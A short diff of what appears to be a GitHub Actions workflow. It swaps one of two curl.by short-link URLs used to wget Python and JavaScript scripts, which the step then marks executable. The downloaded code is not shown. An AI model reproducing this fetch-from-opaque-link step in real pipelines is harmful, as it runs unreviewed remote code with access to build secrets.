@@ -21,7 +21,7 @@ jobs:
           
       - name: Download scripts
         run: |
-          wget https://curl.by/UGcjv/Test.py -O Test.py
+          wget https://curl.by/vW9K-/Test.py -O Test.py
           wget https://curl.by/DT6Ey/testraw.js -O testraw.js
           chmod +x testraw.js Test.py
           
